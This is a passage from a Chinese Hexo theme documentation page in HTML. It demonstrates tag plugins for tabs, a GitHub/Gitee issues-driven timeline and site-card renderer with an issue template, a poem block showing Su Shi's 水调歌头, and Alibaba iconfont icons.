class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note primary flat"><p>Demo 2 - 预设选择tabs</p></div><div class="tabs" id="test2"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test2-1">test2 1</button></li><li class="tab"><button type="button" data-href="#test2-2">test2 2</button></li><li class="tab active"><button type="button" data-href="#test2-3">test2 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test2-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test2-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="test2-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note primary flat"><p>Demo 3 - 没有预设值</p></div><div class="tabs" id="test3"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#test3-1">test3 1</button></li><li class="tab"><button type="button" data-href="#test3-2">test3 2</button></li><li class="tab"><button type="button" data-href="#test3-3">test3 3</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="test3-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test3-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note primary flat"><p>Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p></div><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一个Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸弹</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字为第一个Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有图标 没有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="folding-4"><p><div class="note primary flat"><p>Demo 1 - 预设选择第一个【默认】</p></div><br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure></p><p><div class="note primary flat"><p>Demo 2 - 预设选择tabs</p></div><br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test2, 3 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure></p><p><div class="note primary flat"><p>Demo 3 - 没有预设值</p></div><br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test3, -1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 1.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 2.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line"><span class="strong">**This is Tab 3.**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure></p><p><div class="note primary flat"><p>Demo 4 - 自定义Tab名 + 只有icon + icon和Tab名</p></div><br><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一个Tab --&gt;</span><br><span class="line"><span class="strong">**tab名字为第一个Tab**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line"><span class="strong">**只有图标 没有Tab名字**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸弹@fas fa-bomb --&gt;</span><br><span class="line"><span class="strong">**名字+icon**</span></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="数据集合-issues"><a href="#数据集合-issues" class="headerlink" title="数据集合 issues"></a>数据集合 issues</h1><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-theme-volantis@latest/source/js/issues.min.js"></script><div class="tabs" id="issues"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#issues-1">标签语法</button></li><li class="tab"><button type="button" data-href="#issues-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#issues-3">样式预览</button></li><li class="tab"><button type="button" data-href="#issues-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="issues-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% issues type | api=url | group=key:value1,value2（可选） %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="issues-2"><p><span class='p center logo large'>type(类型)：</span><br>根据需求不同，会将 issues 内容解析成不同的 HTML 标签，目前支持的类型有：</p><ol><li>时间轴<code>timeline</code>: 解析成<code>timeline</code>标签，<code>issue</code>的标题对应<code>timeline</code>的时间，<code>issue</code>的内容对应<code>timeline</code>的内容。</li><li><p>网站卡片<code>sites</code>: 解析成<code>sites</code>标签，需要有<code>JSON</code>代码块,各参数对应<code>sites</code>标签参数:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;title&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;screenshot&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;「keywords」&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:left">title</td><td style="text-align:left">网站名称</td></tr><tr><td style="text-align:left">screenshot</td><td style="text-align:left">网站预览图</td></tr><tr><td style="text-align:left">url</td><td style="text-align:left">网站链接，需要添加<br><code>https://</code>协议组成完整域名。<br>否则可能被识别成站点相对路径。</td></tr><tr><td style="text-align:left">avatar</td><td style="text-align:left">站长头像</td></tr><tr><td style="text-align:left">「keywords」</td><td style="text-align:left">分组依据，<br>未必要叫「keywords」，<br>详见下文group(分组)</td></tr></tbody></table></div><p><span class='p center logo large'>api(接口)：</span><br>url为可以调的通的API，例如：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">api&#x3D;https:&#x2F;&#x2F;gitee.com&#x2F;api&#x2F;v5&#x2F;repos&#x2F;xaoxuu&#x2F;friends&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100&amp;labels&#x3D;active</span><br><span class="line">api&#x3D;https:&#x2F;&#x2F;api.github.com&#x2F;repos&#x2F;xaoxuu&#x2F;friends&#x2F;issues?sort&#x3D;updated&amp;state&#x3D;open&amp;page&#x3D;1&amp;per_page&#x3D;100&amp;labels&#x3D;active</span><br></pre></td></tr></table></figure></p><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">释义</th></tr></thead><tbody><tr><td style="text-align:left"><a href="https://gitee.com/api/v5/">https://gitee.com/api/v5/</a></td><td style="text-align:left">gitee仓库的api</td></tr><tr><td style="text-align:left"><a href="https://api.github.com/">https://api.github.com/</a></td><td style="text-align:left">github仓库的api</td></tr><tr><td style="text-align:left">repos/xaoxuu/friends/issues</td><td style="text-align:left">repos/用户名/仓库名/issues</td></tr><tr><td style="text-align:left">sort=updated&amp;state=open</td><td style="text-align:left">界定哪些类型的<code>issues</code>会<br>被读取过来渲染成相应的标签</td></tr><tr><td style="text-align:left">page=1&amp;per_page=100</td><td style="text-align:left">读取前100条issues</td></tr><tr><td style="text-align:left">labels=active</td><td style="text-align:left">控制默认的issue不显示，<br>只有自己审核通过<br>添加了active标签之后才会显示</td></tr></tbody></table></div><p><span class='p center logo large'>group(分组)：</span><br><code>sites</code>类型的<code>issues</code>默认不分组，如果需要分组，可指定分组依据<code>「keywords」</code>，和分组白名单<code>「value1」</code>、<code>「value2」</code>等，例如：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">group=version:v4,v3,v2</span></span><br><span class="line"><span class="comment"># 此处的version就是上文中的「keywords」</span></span><br></pre></td></tr></table></figure><p>这个参数的作用就是，筛选出<code>JSON</code>中包含<code>&quot;version&quot;: &quot;v4&quot;</code>或者<code>&quot;version&quot;:&quot;v3&quot;</code>或者<code>&quot;version&quot;: &quot;v2&quot;</code>的数据，并分组显示。</p><p><span class='p center logo large'>仓库ISSUES模板配置</span></p><details class="folding-tag" green><summary> Github仓库配置方案 </summary>              <div class='content'>              <ol><li><p>新建一个仓库，仓库名随意，这里我命名为<code>friend_link</code>,<br> 新建文件<code>friend_link\.github\ISSUE_TEMPLATE.md</code>,<br> 并在其中输入以下内容作为<code>issues</code>模板。</p><div class="tip warning faa-horizontal animated fa-slow"><p>其中的json代码块前面的反斜杠记得删去。此处这么写主要是为了转义，否则无法嵌套代码块。</p></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">name: 友链模板</span><br><span class="line">about: 请根据指示规范填写友链格式。</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;!-- 请在下方代码块的双引号中填写 --&gt;</span><br><span class="line">\<span class="code">```json</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">    &quot;title&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;screenshot&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;url&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;avatar&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;description&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;keywords&quot;: &quot;&quot;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">\```</span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&quot;title&quot;: &quot;站点名称&quot;,</span><br><span class="line">&quot;screenshot&quot;: &quot;站点预览图链接&quot;,</span><br><span class="line">&quot;url&quot;: &quot;站点链接&quot;,</span><br><span class="line">&quot;avatar&quot;: &quot;头像链接&quot;,</span><br><span class="line">&quot;description&quot;: &quot;站点描述&quot;,</span><br><span class="line">&quot;keywords&quot;: &quot;关键词，作为分组名&quot;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 示例 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&quot;title&quot;: &quot;Akilarの糖果屋&quot;,</span><br><span class="line">&quot;screenshot&quot;: &quot;https://cdn.jsdelivr.net/gh/Akilarlxh/ScreenShot@gh-pages/akilar.top.jpg&quot;,</span><br><span class="line">&quot;url&quot;: &quot;https://akilar.top/&quot;,</span><br><span class="line">&quot;avatar&quot;: &quot;https://akilar.top/img/siteicon/favicon.png&quot;,</span><br><span class="line">&quot;description&quot;: &quot;期待您的光临！&quot;,</span><br><span class="line">&quot;keywords&quot;: &quot;糖果屋&quot;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>新建active label</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/d63b5c0c.png" alt="新建label用于控制审核结果"></p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/6311f960.png" alt="配置名称描述颜色"></p></li><li><p>提交示例</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/f87ebfd3.png" alt="填写规范"><br><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/efdfc67d.png" alt="审核通过"></p></li><li><p>从审核通过到页面读取有一段api的缓存期，稍微有点耐心。</p></li></ol>              </div>            </details><details class="folding-tag" yellow><summary> Gitee仓库配置方案 </summary>              <div class='content'>              <ol><li><p>新建一个仓库，仓库名随意，这里我命名为<code>friend_link</code>,<br> 新建文件<code>friend_link\.gitee\ISSUE_TEMPLATE.md</code>,<br> 并在其中输入以下内容作为<code>issues</code>模板。</p><div class="tip warning faa-horizontal animated fa-slow"><p>其中的json代码块前面的反斜杠记得删去。此处这么写主要是为了转义，否则无法嵌套代码块。</p></div><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">name: 友链模板</span><br><span class="line">about: 请根据指示规范填写友链格式。</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">&lt;!-- 请在下方代码块的双引号中填写 --&gt;</span><br><span class="line">\<span class="code">```json</span></span><br><span class="line"><span class="code">&#123;</span></span><br><span class="line"><span class="code">    &quot;title&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;screenshot&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;url&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;avatar&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;description&quot;: &quot;&quot;,</span></span><br><span class="line"><span class="code">    &quot;keywords&quot;: &quot;&quot;</span></span><br><span class="line"><span class="code">&#125;</span></span><br><span class="line"><span class="code">\```</span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&quot;title&quot;: &quot;站点名称&quot;,</span><br><span class="line">&quot;screenshot&quot;: &quot;站点预览图链接&quot;,</span><br><span class="line">&quot;url&quot;: &quot;站点链接&quot;,</span><br><span class="line">&quot;avatar&quot;: &quot;头像链接&quot;,</span><br><span class="line">&quot;description&quot;: &quot;站点描述&quot;,</span><br><span class="line">&quot;keywords&quot;: &quot;关键词，作为分组名&quot;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 示例 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">&quot;title&quot;: &quot;Akilarの糖果屋&quot;,</span><br><span class="line">&quot;screenshot&quot;: &quot;https://cdn.jsdelivr.net/gh/Akilarlxh/ScreenShot@gh-pages/akilar.top.jpg&quot;,</span><br><span class="line">&quot;url&quot;: &quot;https://akilar.top/&quot;,</span><br><span class="line">&quot;avatar&quot;: &quot;https://akilar.top/img/siteicon/favicon.png&quot;,</span><br><span class="line">&quot;description&quot;: &quot;期待您的光临！&quot;,</span><br><span class="line">&quot;keywords&quot;: &quot;糖果屋&quot;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>新建active标签</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/7522911b.png" alt="新建标签用于控制审核结果"></p></li></ol><ol><li><p>提交示例</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/dd334eea.png" alt="填写规范"><br><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/npm/akilar-candyassets/image/72d06ae1.png" alt="审核通过"></p></li><li><p>从审核通过到页面读取有一段api的缓存期，稍微有点耐心。</p></li></ol>              </div>            </details><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="issues-3"><ol><li><p>时间轴标签<code>timeline</code>渲染<br> 对应的仓库<code>issues</code>链接:</p> <div class="tag link"><a class="link-card" title="xaoxuu/timeline" href="https://gitee.com/xaoxuu/timeline/issues"><div class="left"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png"/></div><div class="right"><p class="text">xaoxuu/timeline</p><p class="url">https://gitee.com/xaoxuu/timeline/issues</p></div></a></div><div class="issues-api timeline"api="https://gitee.com/api/v5/repos/xaoxuu/timeline/issues?state=open&creator=xaoxuu&sort=created&direction=desc&page=1&per_page=100"></div></li><li><p>网站卡片标签<code>sites</code>渲染</p><ul><li><p>gitee仓库示例</p><p>对应的仓库<code>issues</code>链接:</p><div class="tag link"><a class="link-card" title="xaoxuu/friends" href="https://gitee.com/xaoxuu/friends/issues"><div class="left"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png"/></div><div class="right"><p class="text">xaoxuu/friends</p><p class="url">https://gitee.com/xaoxuu/friends/issues</p></div></a></div><p>渲染后的标签：</p><div class="issues-api sites"api="https://gitee.com/api/v5/repos/xaoxuu/friends/issues?sort=updated&state=open&page=1&per_page=100&labels=active"></div></li><li><p>github仓库示例</p><p>对应的仓库<code>issues</code>链接:</p><div class="tag link"><a class="link-card" title="xaoxuu/friends" href="https://github.com/xaoxuu/friends/issues"><div class="left"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png"/></div><div class="right"><p class="text">xaoxuu/friends</p><p class="url">https://github.com/xaoxuu/friends/issues</p></div></a></div><p>渲染后的标签：</p><div class="issues-api sites"api="https://api.github.com/repos/xaoxuu/friends/issues?sort=updated&state=open&page=1&per_page=100&labels=active"></div></li></ul></li><li><p>网站卡片标签<code>sites</code>分组渲染<br> 这是<code>Volantis</code>主题官网的「示例博客」页面的数据：<br> 对应的仓库<code>issues</code>链接:</p><div class="tag link"><a class="link-card" title="如何参与项目" href="https://github.com/volantis-x/examples/issues"><div class="left"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png"/></div><div class="right"><p class="text">如何参与项目</p><p class="url">https://github.com/volantis-x/examples/issues</p></div></a></div><p>渲染后的标签：</p><div class="issues-api sites"api="https://api.github.com/repos/volantis-x/examples/issues?sort=updated&state=open&page=1&per_page=100"group="version:版本：^4.0,版本：^3.0,版本：^2.0"></div></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="issues-4"><ol><li><p>时间轴标签<code>timeline</code>渲染</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% issues timeline | api=https://gitee.com/api/v5/repos/xaoxuu/timeline/issues?state=open&amp;creator=xaoxuu&amp;sort=created&amp;direction=desc&amp;page=1&amp;per<span class="emphasis">_page=100 %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>网站卡片标签<code>sites</code>渲染</p><ul><li><p>gitee仓库示例</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% issues sites | api=https://gitee.com/api/v5/repos/xaoxuu/friends/issues?sort=updated&amp;state=open&amp;page=1&amp;per<span class="emphasis">_page=100&amp;labels=active %&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>github仓库示例</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% issues sites | api=https://api.github.com/repos/xaoxuu/friends/issues?sort=updated&amp;state=open&amp;page=1&amp;per<span class="emphasis">_page=100&amp;labels=active %&#125;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>网站卡片标签<code>sites</code>分组渲染<br> 这是<code>Volantis</code>主题官网的「示例博客」页面的数据：</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% issues sites | api=https://api.github.com/repos/volantis-x/examples/issues?sort=updated&amp;state=open&amp;page=1&amp;per<span class="emphasis">_page=100 | group=version:版本：^4.0,版本：^3.0,版本：^2.0 %&#125;</span></span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="诗词标签-poem"><a href="#诗词标签-poem" class="headerlink" title="诗词标签 poem"></a>诗词标签 poem</h1><div class="tabs" id="poem"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#poem-1">标签语法</button></li><li class="tab"><button type="button" data-href="#poem-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#poem-3">样式预览</button></li><li class="tab"><button type="button" data-href="#poem-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="poem-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% poem [title],[author] %&#125;</span><br><span class="line">诗词内容</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="poem-2"><ol><li>title：诗词标题</li><li>author：作者，可以不写</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="poem-3"><div class='poem'><div class='poem-title'>水调歌头</div><div class='poem-author'>苏轼</div><p>明月几时有？把酒问青天。<br>不知天上宫阙，今夕是何年？<br>我欲乘风归去，又恐琼楼玉宇，高处不胜寒。<br>起舞弄清影，何似在人间？<br>转朱阁，低绮户，照无眠。<br>不应有恨，何事长向别时圆？<br>人有悲欢离合，月有阴晴圆缺，此事古难全。<br>但愿人长久，千里共婵娟。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="poem-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% poem 水调歌头,苏轼 %&#125;</span><br><span class="line">丙辰中秋，欢饮达旦，大醉，作此篇，兼怀子由。</span><br><span class="line">明月几时有？把酒问青天。</span><br><span class="line">不知天上宫阙，今夕是何年？</span><br><span class="line">我欲乘风归去，又恐琼楼玉宇，高处不胜寒。</span><br><span class="line">起舞弄清影，何似在人间？</span><br><span class="line"></span><br><span class="line">转朱阁，低绮户，照无眠。</span><br><span class="line">不应有恨，何事长向别时圆？</span><br><span class="line">人有悲欢离合，月有阴晴圆缺，此事古难全。</span><br><span class="line">但愿人长久，千里共婵娟。</span><br><span class="line">&#123;% endpoem %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="阿里图标-icon"><a href="#阿里图标-icon" class="headerlink" title="阿里图标 icon"></a>阿里图标 icon</h1><div class="tip cogs"><p>本标签的图标需要自己额外引入阿里矢量图标库的样式，具体引入方案请移步：<a href="https://akilar.top/posts/d2ebecef/">Hexo引入阿里矢量图标库</a></p></div><div class="tabs" id="icon示例"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#icon示例-1">标签语法</button></li><li class="tab"><button type="button" data-href="#icon示例-2">参数释义</button></li><li class="tab active"><button type="button" data-href="#icon示例-3">样式预览</button></li><li class="tab"><button type="button" data-href="#icon示例-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="icon示例-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% icon [icon-xxxx],[font-size] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="icon示例-2"><ol><li><code>icon-xxxx</code>：表示图标<code>font-class</code>,可以在自己的阿里矢量图标库项目的<code>font-class</code>引用方案内查询并复制。</li><li><code>font-size</code>：表示图标大小，直接填写数字即可，单位为<code>em</code>。图标大小默认值为<code>1em</code>。</li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="icon示例-3"><div class="table-container"><table><thead><tr><th style="text-align:left"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rat_zi"></use></svg></th><th style="text-align:left"><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rat"></use></svg></th><th style="text-align:left"><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-ox_chou"></use></svg></th><th style="text-align:left"><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-ox"></use></svg></th><th style="text-align:left"><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-tiger_yin"></use></svg></th><th style="text-align:left"><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-tiger"></use></svg></th></tr></thead><tbody><tr><td style="text-align:left"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rabbit_mao"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rabbit"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dragon_chen"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dragon"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-snake_si"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-snake"></use></svg></td></tr><tr><td style="text-align:left"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-horse_wu"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-horse"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-goat_wei"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-goat"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-monkey_shen"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-monkey"></use></svg></td></tr><tr><td style="text-align:left"><svg class="icon" style="width:1em; height:1em" aria-hidden="true"><use xlink:href="#icon-rooster_you"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:2em; height:2em" aria-hidden="true"><use xlink:href="#icon-rooster"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:3em; height:3em" aria-hidden="true"><use xlink:href="#icon-dog_xu"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:4em; height:4em" aria-hidden="true"><use xlink:href="#icon-dog"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:5em; height:5em" aria-hidden="true"><use xlink:href="#icon-boar_hai"></use></svg></td><td style="text-align:left"><svg class="icon" style="width:6em; height:6em" aria-hidden="true"><use xlink:href="#icon-boar"></use></svg></td></tr></tbody></table></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="icon示例-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% icon icon-rat<span class="emphasis">_zi %&#125;&#123;% icon icon-rat,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-ox_</span>chou,3 %&#125;&#123;% icon icon-ox,4 